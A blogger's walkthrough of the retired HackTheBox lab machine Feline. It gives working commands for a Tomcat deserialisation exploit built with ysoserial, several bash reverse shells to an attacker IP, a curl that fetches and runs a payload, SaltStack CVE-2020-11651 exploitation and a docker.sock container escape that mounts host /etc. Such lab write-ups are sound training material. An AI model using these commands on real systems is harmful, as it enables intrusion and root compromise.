---
layout: walkthrough
title: HackTheBox - Feline
date: 2021-02-21 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/feline.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at Feline --`10.10.10.205`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Feline/Overview.png"  style="width: 65%" />
</p>

## Information Gathering

In order to start the VM, we start with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Feline$ nmap -sC -sV 10.10.10.205
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-07 07:44 EST
Nmap scan report for 10.10.10.205
Host is up (0.17s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat 9.0.27
|_http-title: VirusBucket
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.15 seconds
```

</details>

From the output shown above, we can see that the machine is a Linux machine and I added `feline.htb` to the `/etc/hosts` file. As this is a Linux machine and it only has 2 open ports, I started by looking into the Tomcat server.  

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Feline/img1.png"  style="width: 100%" />
</p>

While I was poking around, I ran Gobuster scans on the host, the output of the scans is shown below:

<details>

```bat

Gobuster:
vagrant@ko:~$ gobuster dir -u http://10.10.10.205:8080 -w=/usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt                                                                                                      
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.205:8080
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/07 07:54:18 Starting gobuster
===============================================================
/images (Status: 302)
/service (Status: 302)
===============================================================
2020/12/07 08:00:32 Finished
===============================================================
```
```bat

vagrant@ko:~$ gobuster dir -u http://10.10.10.205:8080/service/ -w=/usr/share/seclists/Discovery/Web-Content/raft-small-files.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.205:8080/service/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/07 08:02:49 Starting gobuster
===============================================================
/index.html (Status: 200)
/style.css (Status: 200)
/license.txt (Status: 200)
/. (Status: 200)
/script.js (Status: 200)
===============================================================
2020/12/07 08:06:19 Finished
===============================================================

```

</details>


Nothing extra really came from the above, so I browsed the application and thought that the area that needed to be tested was the service portion: <http://10.10.10.205:8080/service/>.


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Feline/img2.png"  style="width: 100%" />
</p>

While browsing the source code, I found the following JavaScript file which contained the information related to the upload functionality within the web page: <http://10.10.10.205:8080/service/script.js>

<details>

```js


$("#uploadButton").click(function(){
  $("#uploadFile").click();
});

$(document).ready(function(){
  ImageUpload.init();
});

var ImageUpload = {
  init:function() {
    $("#uploadFile").change(function(){
        ImageUpload.readURL(this);
    });
  },
  readURL:function(input) {
    if (input.files && input.files[0]) {
        var reader = new FileReader();
        reader.onload = function (e) {
		/*
          $('.header').css(
              "background-image",
              "url(" + e.target.result + ")"
            );
          $(".clipped").css(
            "background-image",
            "url(" + e.target.result + ")"
          ); */
        } 
        reader.readAsDataURL(input.files[0]); 
    }
  },
}

async function upload() {
  let photo = document.getElementById("uploadFile").files[0];
  let req = new XMLHttpRequest();
  let email = document.getElementById("email").value;
  let formData = new FormData();

  formData.append("image", photo);

  await fetch('/upload.jsp?email=' + email , { method: "POST", body: formData})
    .then(response=>response.text())
    .then(data=>{ 
	    if(data.includes("successfully")) {
		    document.getElementById("msg").innerText = "Upload successful! The report will be sent via e-mail.";
	    }
	    else {
		    document.getElementById("msg").innerText = "File upload failed";
	    }
    })
    .catch(function(error) { 
	    document.getElementById("msg").innerText = "File upload failed";
    });
	
}

```

</details>


Since I knew there was some file upload functionality, I started looking from vulnerabilities for the Tomcat version: <https://www.cybersecurity-help.cz/vdb/apache_foundation/apache_tomcat/9.0.27/>. It turns out there is a Remote Code Execution (RCE) vulnerability (<https://www.cybersecurity-help.cz/vdb/SB2020052124>) which affects this version of Tomcat:

> The vulnerability allows a remote attacker to execute arbitrary code on the target system. The vulnerability exists due to insecure input validation when processing  serialized data in uploaded files names. A remote attacker can pass  specially crafted file name to the application and execute arbitrary code on the target system. Successful exploitation of this  vulnerability may result in complete compromise of vulnerable system but requires that the server is configured to use PersistenceManager with a  FileStore and the attacker knows relative file path from storage location.

Awesome! That definitely sounds like a possible way into the system. I kept looking for additional writeups on the vulnerability and came across the following blog post:< https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/>. There are a number of prerequisites for this vulnerability to be exploitable: 

1. The PersistentManager is enabled and it’s using a FileStore
2. The attacker is able to upload a file with arbitrary content, has control over the filename and knows the location where it is uploaded
3. There are gadgets in the classpath that can be used for a Java deserialization attack

In order to ensure that this was the way forward, I started by uploading a file with an empty filename to the server:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Feline/img3.png"  style="width: 70%" />
</p>

Once the file was uploaded, it resulted in the following error:


<details>

```java

<div id="error">
java.io.FileNotFoundException: /opt/samples/uploads (Is a directory)
	at java.base/java.io.FileOutputStream.open0(Native Method)
	at java.base/java.io.FileOutputStream.open(FileOutputStream.java:298)
	at java.base/java.io.FileOutputStream.<init>(FileOutputStream.java:237)
	at java.base/java.io.FileOutputStream.<init>(FileOutputStream.java:187)
	at org.apache.commons.fileupload.disk.DiskFileItem.write(DiskFileItem.java:394)
	at org.apache.jsp.upload_jsp._jspService(upload_jsp.java:205)
	at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:741)
	at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:476)
	at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:385)
	at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:329)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:741)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:526)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:678)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:408)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:861)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1579)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.base/java.lang.Thread.run(Thread.java:834)
</div>

```

</details>

I now knew that the location that the files were stored in was called: `opt/samples/uploads`. Since I has this information and I could point the `JSESSIONID` to the file location, it seemed likely that this RCE would work. This is because:

1. Tomcat requests the Manager to check if a session with session ID "../../../../../../opt/samples/uploads/test" exists
2. It will first check if it has that session in memory.
3. It does not. But the currently running Manager is a PersistentManager, so it will also check if it has the session on disk.
4. It will check at location directory + sessionid + ".session", which evaluates to "./session/../../../../../../opt/samples/uploads/test/hotshoto.session"
5. If the file exists, it will deserialize it and parse the session information from it.

> Of course, all that is left to exploit the vulnerability is for the attacker to put a malicious serialized object (i.e. generated by ysoserial) at location `opt/samples/uploads/.session`. If you are unfamiliar with exploiting Java deserialization vulnerabilities, we have an online course available that teaches you all the details.


### Exploiting Java Deserialization
I started off with a basic payload to see if the deserialisation would work. I created `deserialisation.sh` with a simple bash reverse shell:

```bat
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.14.49/1234 0>&1"
```

From there, I needed to download ysoserial: <https://github.com/frohoff/ysoserial> in order to create a serialised object. I'm certain that there are other methods to accomplish this, I just enjoy ysoserial for deserialization attacks. The worst part about this process is determining which commons collection would work for your instance. I generally skip the first one and then work my way down the list. Fortunately, this instance used `CommonsCollections2` which worked! The next step in the process is getting the object to download our file onto the server. We can use a simple server on our side and then wget or curl on the host's infrastructure to pull our payload.

```bat
curl http://10.10.14.49/deserialization.sh -o /tmp/hotshoto.sh
```

The next step in this process was that I needed to create a `.session` file. The final ysoserial command looks as follows:

```bat
vagrant@ko:~/Desktop/HackTheBox/Feline$ java -jar ysoserial.jar CommonsCollections2 'curl http://10.10.14.49/deserialization.sh -o /tmp/hotshoto.sh' > pullPayload.session

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
```

Finally, I needed to have some method of executing this payload. I created another `.session` file based on this which simply called the first file that I already pulled onto the server.

```bat
vagrant@ko:~/Desktop/HackTheBox/Feline$  java -jar ysoserial.jar CommonsCollections2 'bash /tmp/hotshoto.sh' > execPayload.session
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
```

Uploading the files could be accomplished through the use of file upload and Burpsuite interception to change the `JSESSIONID`, however curl works just as well and it's a very simple payload to execute. I needed to start a python server on my side: `python3 -m http.server 80` in order to have the serialised object pull the required reverse shell file:

```bat
curl 'http://10.10.10.205:8080/upload.jsp' -H 'Cookie: JSESSIONID=../../../../../opt/samples/uploads/pullPayload' -F 'image=@pullPayload.session'
```
```bat
curl 'http://10.10.10.205:8080/upload.jsp' -H 'Cookie: JSESSIONID=../../../../../opt/samples/uploads/execPayload' -F 'image=@execPayload.session'
```

What this is doing is uploading the files on disk to the session variable:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Feline/img4.png"  style="width: 70%" />
</p>

Success! We can see that it failed exactly like the in the example, with the `java.base&#47;java.io.ObjectInputStream.readObject(ObjectInputStream.java:440)` and `org.apache.catalina.session.PersistentManagerBase.loadSessionFromStore(PersistentManagerBase.java:764)` lines in the error output, thereby providing me with a reverse shell. 


## Lateral Movement using Tomcat

Now that I had access to the host, I ran some basic enumeration which is shown below:

<details>

```bat

tomcat@VirusBucket:/$ echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;
echo " ";echo "ifconfig:";/sbin/ifconfig -a; echo " ";echo "groups:";groups;
<;/sbin/ifconfig -a; echo " ";echo "groups:";groups;
                                                         
uname -a:                                                                                                         
Linux VirusBucket 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
  
hostname:
VirusBucket

id
uid=1000(tomcat) gid=1000(tomcat) groups=1000(tomcat)
tomcat@VirusBucket:/opt/tomcat$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<ups;python3 -c 'import pty; pty.spawn("/bin/bash")'
 
ifconfig:
br-e9220f64857c: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
        ether 02:42:2a:b1:ca:3b  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:83ff:fe2e:a3bb  prefixlen 64  scopeid 0x20<link>
        ether 02:42:83:2e:a3:bb  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 17  bytes 1366 (1.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.205  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 dead:beef::250:56ff:feb9:b259  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:b259  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:b2:59  txqueuelen 1000  (Ethernet)
        RX packets 551482  bytes 81636465 (81.6 MB)
        RX errors 0  dropped 39  overruns 0  frame 0
        TX packets 547422  bytes 557331406 (557.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 12063  bytes 949282 (949.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12063  bytes 949282 (949.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth6eda269: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::b8f2:44ff:fef5:2cdd  prefixlen 64  scopeid 0x20<link>
        ether ba:f2:44:f5:2c:dd  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 34  bytes 2652 (2.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

 
groups:
tomcat

```

</details>

Since it looked like I was inside a docker container, I ran some additional enumeration:

<details>

```bat
tomcat@VirusBucket:/$ ip n
ip n
10.10.10.2 dev ens160 lladdr 00:50:56:b9:30:b0 REACHABLE
fe80::250:56ff:feb9:30b0 dev ens160 lladdr 00:50:56:b9:30:b0 router STALE

tomcat@VirusBucket:/opt/tomcat$ netstat -ano                                                                      
netstat -ano                                                                                                      
Active Internet connections (servers and established)                                                             
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:4505          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:4506          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:46751         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 10.10.10.205:38998      10.10.14.49:1234        CLOSE_WAIT  off (0.00/0/0)
tcp        0      1 10.10.10.205:38978      1.0.0.1:53              SYN_SENT    on (3.88/2/0)
tcp        0    156 10.10.10.205:39192      10.10.14.49:1234        ESTABLISHED on (0.39/0/0)
tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::8080                 :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)                    
udp        0      0 127.0.0.1:58952         127.0.0.53:53           ESTABLISHED off (0.00/0/0)
udp        0      0 127.0.0.53:53           0.0.0.0:*                           off (0.00/0/0)

```

</details>

I was definitely in a container, this can also be seen by the use of `/opt/containerd`.  Containerd is used by Docker, Kubernetes CRI, and a few other projects.
> Containerd was designed to be used by Docker and Kubernetes as well as any other container platform that wants to abstract away syscalls or OS specific functionality to run containers on linux, windows, solaris, or other OSes.

Since I had a shell via the Tomcat user, I knew that I was able to create files in `/opt/tomcat/conf/` so I created a working directory there and uploaded `linpeas.sh`. This didn't show anything new, but it did once again highlight some of the listening ports on the machine. When doing some basic Google Fu, it appeared to be linked to SaltStack: <https://docs.saltstack.com/en/latest/topics/tutorials/firewall.html>. There did appear to be known RCE's for SaltStack so I decided to follow this train of thought.


### Exploiting SaltStack

My initial searching lead me to: <https://www.exploit-db.com/exploits/48421>, which was a Python saltstack exploit. 

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Feline/img5.png"  style="width: 70%" />
</p>

Even though it didn't appear to be possible to execute this through the host since I did not have the `salt` module installed, it would be possible to execute it on my own machine where I had control over the modules. In order to accomplish this I could do port forwarding from the host. Since I didn't have credentials for the tomcat user, it was not possible to do an SSH port forward, however there are other methods such as Chisel which would work.

On my machine -- Kali, I started the Chisel server:
```bat
./chisel server -p 9876 --reverse
```

On the compromised host, I then started the client:

```bat
./chisel client 10.10.14.49:9876 R:4506:127.0.0.1:4506
```

Once the connection was established, I ran the exploit on my machine:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Feline/img6.png"  style="width: 70%" />
</p>

Success! I successfully ran the exploit through the reverse proxy and have now confirmed that SaltStack is vulnerable to the exploit. It also confirmed that the master is the local host. Using this information, I found a PoC for this exploit on Github: <https://github.com/jasperla/CVE-2020-11651-poc.git>.

## Privilege Escalation via SaltStack

With access to the PoC, I needed to confirm how it would work so I spent some time looking into the help options:

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Feline/CVE-2020-11651-poc$ python3 exploit.py --help
usage: exploit.py [-h] [--master MASTER_IP] [--port MASTER_PORT] [--force] [--debug] [--run-checks]
                  [--read READ_FILE] [--upload-src UPLOAD_SRC] [--upload-dest UPLOAD_DEST] [--exec EXEC]
                  [--exec-all EXEC_ALL]

Saltstack exploit for CVE-2020-11651 and CVE-2020-11652

optional arguments:
  -h, --help            show this help message and exit
  --master MASTER_IP, -m MASTER_IP
  --port MASTER_PORT, -p MASTER_PORT
  --force, -f
  --debug, -d
  --run-checks, -c
  --read READ_FILE, -r READ_FILE
  --upload-src UPLOAD_SRC
  --upload-dest UPLOAD_DEST
  --exec EXEC           Run a command on the master
  --exec-all EXEC_ALL   Run a command on all minions

```

</details>

Once I was happy that I knew how the exploit was meant to work, I pointed the `master` to localhost and executed a simple bash reverse shell:

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Feline/CVE-2020-11651-poc$ python3 exploit.py --master 127.0.0.1 --exec 'bash -c "
bash -i >& /dev/tcp/10.10.14.49/4444 0>&1"'                                                                       
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (127.0.0.1:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: ngSMA2k+EhtPw11YPNk0HwMG5VyiAaJXCPHHKibIsuMX6USMKc6JWAFeE9nLtUQnxOaKR6hWNpA=
[+] Attemping to execute bash -c "bash -i >& /dev/tcp/10.10.14.49/4444 0>&1" on 127.0.0.1
[+] Successfully scheduled job: 20201207143003884837

```

</details>

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Feline/img7.png"  style="width: 70%" />
</p>


## Escaping Docker using docker.sock

I successfully managed to exploit the vulnerability and has root within the Docker container. There was a `todo.txt` file on the host, the contents of which are shown below:

```text
- Add saltstack support to auto-spawn sandbox dockers through events.
- Integrate changes to tomcat and make the service open to public.
```

Looking at the bash history of the user, I saw an entries for `auto-spawn sandbox` and `docker.sock`:

<details>

```bat

root@2d24bf61767c:~# cat .bash_history
paswd
passwd
passwd
passswd
passwd
passwd
cd /root
ls
ls -la
rm .wget-hsts 
cd .ssh/
ls
cd ..
printf '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.' > todo.txt
cat todo.txt 
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.' > todo.txt
cat todo.txt 
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\' > todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\n' > todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\' > todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\n' > todo.txt
cat todo.txt 
printf -- '- Add saltstack support to auto-spawn sandbox dockers through events.\n- Integrate changes to tomcat and make the service open to public.\n' > todo.txt
cd /home/tomcat
cat /etc/passwd
exit
cd /root/
ls
cat todo.txt 
ls -la /var/run/
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
exit

```

</details>

I found some blog posts regarding `docker.sock`: <https://dejandayoff.com/the-danger-of-exposing-docker.sock/> which described ways in which it could be abused.

> docker.sock is the UNIX socket that Docker daemon is listening to. It's the main entry point for Docker API. It also can be TCP socket but by default for security reasons Docker defaults to use UNIX socket. Exploiting a exposed docker.sock file allows you to do pretty much anything you want with any of the containers that run on the host. Access to the docker.sock file, locally or remotely, allows you to control docker as if you were on the host itself running docker commands.

There were 2 very interesting lines within the bash_history file. `ls -la /var/run/` which contained the salt and `docker.sock` files, as well as the `curl -s --unix-socket /var/run/docker.sock http://localhost/images/json` command which shows us how to interact with `docker.sock`.

The first step in this process was to get a list of all containers on the host. To do this, the following http request needed to be executed:

```json
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
```

Once I had the container ID, I used the following curl command to determine if there was code execution:

```json
curl -XPOST --unix-socket /var/run/docker.sock --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/root/root.txt"],"DetachKeys": "ctrl-p,ctrl-q"}' -H "Content-Type: application/json" http://localhost/containers/2d24bf61767ce2a7a78e842ebc7534db8eb1ea5a5ec21bb735e472332b8f9ca2/exec
```
```json
curl -XPOST --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' --data-binary '{"Detach": false,"Tty": false}' http://localhost/exec/cdd16ae3094015eb00f304a61ffbdf9051351c6e274ee15658362cbd382b3ce8/start --output -
```

This resulted in the following error: `/cat: /root/root.txt: No such file or directory`. However, changing the file to `todo.txt` resulted in the previous file being output to the screen which more than likely meant that I needed to create my own container.  Okay! I now had command execution through the container. Using this information, I attempted to get a reverse shell back to my machine. In order to test out the commands using a container that already works, I changed the command to return a reverse shell instead. 

```json
curl -XPOST --unix-socket /var/run/docker.sock --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["/bin/bash", "-c","bash -i >& /dev/tcp/10.10.14.49/4321 0>&1"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' -H "Content-Type: application/json" http://localhost/containers/2d24bf61767ce2a7a78e842ebc7534db8eb1ea5a5ec21bb735e472332b8f9ca2/exec
```
```json
curl -XPOST --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' --data-binary '{"Detach": false,"Tty": false}' http://localhost/exec/4a63b8963e636629afd1af54af6a7772e8e0c1f31732f67214aa2eb58789d15c/start --output -
```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Feline/img8.png"  style="width: 70%" />
</p>

Using this I did get a reverse shell, the only issue is that it was on the host I already had access to and since I was using the same container that I already had access to, it provided me with the same access. In order to exploit this correctly to obtain the root shell, I needed to create my own container. Since I didn't have any containers available, I needed to create one. I was able to set the new container to use the sandbox image which was determined using the following command: 

```json
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
```

```json
root@2d24bf61767c:/var/run# curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
[{"Containers":-1,"Created":1590787186,"Id":"sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e","Labels":null,"ParentId":"","RepoDigests":null,"RepoTags":["sandbox:latest"],"SharedSize":-1,"Size":5574537,"VirtualSize":5574537},{"Containers":-1,"Created":1588544489,"Id":"sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9","Labels":null,"ParentId":"","RepoDigests":["<none>@<none>"],"RepoTags":["<none>:<none>"],"SharedSize":-1,"Size":1056679100,"VirtualSize":1056679100}]
```

Based on the information above, there was a repository named `sandbox:latest`. I could use this repository to create my own version:

```json
curl -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\": \"sandbox\"}" -H 'Content-Type: application/json' http://localhost/containers/create
```
```json
{"Id":"c18982f5857810c60deafe7fbacfec4e8569e04bf42853289b02ffdf5a121144","Warnings":[]}
```

Using the ID provided above, I was able to target the `/containers/<ID>/start` endpoint to start the newly created container.

```json
curl -XPOST --unix-socket /var/run/docker.sock -H 'Content-Type: application/json'  http://localhost/containers/c18982f5857810c60deafe7fbacfec4e8569e04bf42853289b02ffdf5a121144/start
```

Okay, this seems to work. Let's now try and do something with this information. Looking back at the exploitation post, there is a `Cmd` field that I could use. In the case of the machine, they are simply trying to cat a file. I started by creating a command file which I would be able to call from the curl command as described in this post: <https://securityboulevard.com/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1/>

```json
cat > create.json << EOF
{
  "Image": "sandbox",
  "Cmd": ["/bin/sh"]
}
EOF
```

Once the command file was on disk, I was able to call it using the following curl command:

```json
curl -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d @create.json http://localhost/containers/create
```

Next, I needed to start the container:

```json
curl -XPOST --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' http://localhost/containers/eadfe9939da43a5856a56059ac9d74c8181097b34cfae5212b53cae1bdc9bedb/start --output -
```

Finally, I could run the exec against it:

```json
curl -s -XPOST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d @create.json http://localhost/containers/eadfe9939da43a5856a56059ac9d74c8181097b34cfae5212b53cae1bdc9bedb/exec
```

With the preparation completed, I was able to start the new container just as I did previously -- however, this command would mount the `/etc` directory instead:

```json
cat > create.json << EOF
{
  "Image":"sandbox",
  "Cmd":["/bin/sh"],
  "DetachKeys":"Ctrl-p,Ctrl-q",
  "OpenStdin":true,
  "Mounts":[
    {
      "Type":"bind",
      "Source":"/etc/",
      "Target":"/host_etc"
    }
  ]
}
EOF
```


```json
root@2d24bf61767c:~# curl -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d @create.json http://localhost/containers/create
```
```json
{"Id":"1571c332659ab2ef78b546ec34be1c5f907cf9cb747cffd1dbac6bf6ba43e0e9","Warnings":[]}
```

```json
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/e7841544cafee507ec5430fbe5672cf47987e6abc91265d2d45ef0ec89dc8f42/start
```

Now that the container had been started, I was able to start a connection to the container. For this I used socat which was not installed on the machine. Socat is located at `/usr/bin/socat` so I just needed to use a simple Python server to get it onto the machine.

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Feline/img9.png"  style="width: 70%" />
</p>


Once socat successfully connected to the docker socket, I was able to type in the following raw HTTP request:

```bat
./socat - UNIX-CONNECT:/var/run/docker.sock
```

```bat
POST /containers/e7841544cafee507ec5430fbe5672cf47987e6abc91265d2d45ef0ec89dc8f42/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Feline/img10.png"  style="width: 70%" />
</p>

Navigating to `/etc_host` showed the mounted `/etc/` directory from the host. Using this I was able to extract the `/etc/shadow` file. I followed this method and simply changed the directory to `/root` and was able to extract the root flag from the host:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Feline/img11.png"  style="width: 70%" />
</p>

If I wanted to obtain a shell from this point, I could add a `.ssh` key to the `authorized_keys` file and access the machine directly! Alternatively, it would be possible to change the command from a mount command to a shell command and have a reverse shell start once the machine was started.

That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.